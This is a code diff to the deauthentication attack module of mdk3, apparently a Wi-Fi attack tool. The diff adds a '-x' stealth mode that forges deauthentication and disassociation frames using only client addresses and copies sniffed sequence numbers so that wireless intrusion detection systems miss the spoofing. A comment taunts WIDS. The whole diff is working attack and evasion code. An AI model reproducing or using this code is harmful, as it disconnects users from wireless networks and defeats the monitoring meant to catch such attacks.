@@ -19,6 +19,7 @@ struct deauth_options {
   char *greylist;
   unsigned char isblacklist;
   unsigned int speed;
+  int stealth;
 };
 
 //Global things, shared by packet creation and stats printing
@@ -40,6 +41,9 @@ void deauth_longhelp()
 	  "         Read file containing MACs to run test on (Blacklist Mode)\n"
 	  "      -s <pps>\n"
 	  "         Set speed in packets per second (Default: unlimited)\n"
+          "      -x\n"
+          "         Enable full IDS stealth by matching all Sequence Numbers\n"
+          "         Packets will only be sent with clients' adresses\n"
 	  "      -c [chan,chan,...,chan[:speed]]\n"
 	  "         Enable channel hopping. When -c h is given, mdk3 will hop an all\n"
 	  "         14 b/g channels. Channel will be changed every 3 seconds,\n"
@@ -55,8 +59,9 @@ void *deauth_parse(int argc, char *argv[]) {
   dopt->greylist = NULL;
   dopt->isblacklist = 0;
   dopt->speed = 0;
+  dopt->stealth = 0;
 
-  while ((opt = getopt(argc, argv, "w:b:s:c:")) != -1) {
+  while ((opt = getopt(argc, argv, "w:b:s:xc:")) != -1) {
     switch (opt) {
       case 'w':
 	if (dopt->isblacklist || dopt->greylist) {
@@ -71,6 +76,9 @@ void *deauth_parse(int argc, char *argv[]) {
       break;
       case 's':
 	dopt->speed = (unsigned int) atoi(optarg);
+      break;
+      case 'x':
+        dopt->stealth = 1;
       break;
       case 'c':
 	speed = 3000000;
@@ -121,7 +129,7 @@ unsigned char accept_target(struct packet *pkt, unsigned char isblacklist, char 
 }
 
 
-unsigned char get_new_target(struct ether_addr *client, struct ether_addr *ap, unsigned char isblacklist, char *greylist) {
+unsigned char get_new_target(struct ether_addr *client, struct ether_addr *ap, unsigned char isblacklist, char *greylist, int stealth) {
   struct packet sniffed;
   struct ieee_hdr *hdr;
   unsigned char wds = 0;
@@ -133,7 +141,8 @@ unsigned char get_new_target(struct ether_addr *client, struct ether_addr *ap, u
     hdr = (struct ieee_hdr *) sniffed.data;
     
     if ((hdr->type != IEEE80211_TYPE_DATA) && (hdr->type != IEEE80211_TYPE_QOSDATA)) continue;
-    
+    if (stealth && ((hdr->flags & 0x03) != 0x01)) continue; //In stealth mode do not impersonate AP, IDS will figure out the duplicate SEQ number!
+
     if (accept_target(&sniffed, isblacklist, greylist)) break;
   }
   
@@ -157,6 +166,8 @@ unsigned char get_new_target(struct ether_addr *client, struct ether_addr *ap, u
     break;
   }
   
+  set_seqno(NULL, get_seqno(&sniffed));  // Eff you, WIDS
+
   free(sniffed.data);
   return wds;
 }
@@ -181,13 +192,14 @@ struct packet deauth_getpacket(void *options) {
   
   switch (state) {
     case 0:
-      wds = get_new_target(&station, &bssid, dopt->isblacklist, dopt->greylist);
+      wds = get_new_target(&station, &bssid, dopt->isblacklist, dopt->greylist, dopt->stealth);
       state = 1;
       return create_deauth(bssid, station, bssid);
     break;
     case 1:
       state = 2;
       if (wds) state = 4;
+      if (dopt->stealth) state = 0;
       return create_disassoc(bssid, station, bssid);
     break;
     case 2:
